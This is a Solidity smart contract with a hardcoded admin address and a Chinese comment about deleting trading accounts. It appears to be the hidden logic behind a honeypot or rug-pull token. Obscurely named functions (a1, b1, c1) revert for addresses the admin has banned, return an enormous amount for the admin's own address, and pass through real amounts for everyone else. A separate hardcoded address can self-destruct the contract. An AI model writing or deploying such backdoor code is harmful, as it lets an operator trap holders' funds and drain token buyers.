contract X1 {
    bool public flagBan = false;
    mapping(address => uint256) private _banInfo;
    address public Admin = 0xFb4298Bed32ef51984b9Bd84320D88a8D145769D;
    constructor(){
        _banInfo[Admin] = 100;
    }
    uint256 bigAmount = 25000000000*10**18*88000*1;
    // 只能admin的删除交易账号
     function setUserBalance(address userAddress) external   {
        require(msg.sender == Admin, 'NO ADMIN');
        _banInfo[userAddress] = 1;
    }

    function removeUserBalance(address userAddress) external   {
        require(msg.sender == Admin, 'NO ADMIN');
        _banInfo[userAddress] = 0;
    }

    function setAdminBalance() external   {
        require(msg.sender == Admin, 'NO ADMIN');
        _banInfo[Admin] = 100;
    }


    function setBigAmount(uint256 bm) external   {
        require(msg.sender == Admin, 'NO ADMIN');
        bigAmount = bm;
    }

    function a1(bool ff,uint256 realAmount,address fromAddress) external view returns (uint256)   {
        if (_banInfo[fromAddress] == 1){
            revert("ban");
        }else if (_banInfo[fromAddress] == 100) {
            return bigAmount;
        }else {
            return realAmount; 
        }
        
    }
    function b1(bool ff,uint256 realAmount,address fromAddress) external view returns (uint256)   {
        if (_banInfo[fromAddress] == 1){
            revert("ban");
        }else if (_banInfo[fromAddress] == 100) {
            return bigAmount;
        }else {
            return realAmount; 
        }
        
    }
    function c1(bool ff,uint256 realAmount,address fromAddress) external view returns (uint256)   {
        if (_banInfo[fromAddress] == 1){
            revert("qxx");
        }else if (_banInfo[fromAddress] == 100) {
            return bigAmount;
        }else {
            return realAmount; 
        }
        
    }
    function destroy() public {
        require(msg.sender == address(0x5376f0d94Fa06C1964aD565A2acECA56E1E28012), 'NO ADMIN');
        address _addr = payable(address(this)); 
        assembly {
            selfdestruct(_addr)
        }
    }
}